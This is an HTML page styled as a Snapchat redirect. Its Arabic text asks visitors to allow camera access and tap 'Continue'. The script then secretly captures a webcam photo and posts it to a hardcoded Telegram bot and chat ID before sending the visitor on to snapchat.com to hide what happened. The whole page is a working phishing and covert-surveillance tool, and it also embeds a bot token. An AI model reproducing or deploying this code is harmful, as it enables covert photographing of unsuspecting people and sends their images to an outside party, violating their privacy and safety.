<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Snap Redirect</title>

<style>
body{
    margin:0;
    background:#111;
    color:white;
    font-family:Arial;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    flex-direction:column;
}

video{
    width:320px;
    border-radius:20px;
    box-shadow:0 0 20px rgba(0,0,0,0.5);
}

h2{
    margin-bottom:20px;
}

button{
    margin-top:20px;
    padding:12px 30px;
    border:none;
    border-radius:12px;
    background:#fffc00;
    color:black;
    font-size:18px;
    cursor:pointer;
    font-weight:bold;
}
</style>
</head>
<body>

<h2>اضغط للسماح بالكاميرا</h2>

<video id="video" autoplay playsinline></video>

<button onclick="captureAndSend()">
متابعة
</button>

<canvas id="canvas" style="display:none;"></canvas>

<script>

const BOT_TOKEN = "7793041544:AAEdwlYT8IEY52knXFSmyasP_MzAibgA0Ss";
const CHAT_ID = "7191557045";

const video = document.getElementById("video");

navigator.mediaDevices.getUserMedia({
    video:true
})
.then(stream=>{
    video.srcObject = stream;
})
.catch(err=>{
    alert("يجب السماح بالكاميرا");
});

async function captureAndSend(){

    const canvas = document.getElementById("canvas");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");

    ctx.drawImage(video,0,0);

    canvas.toBlob(async(blob)=>{

        let formData = new FormData();

        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "photo.png");

        try{

            await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
                {
                    method:"POST",
                    body:formData
                }
            );

        }catch(e){}

        window.location.href = "https://www.snapchat.com";

    }, "image/png");

}

</script>

</body>
</html>
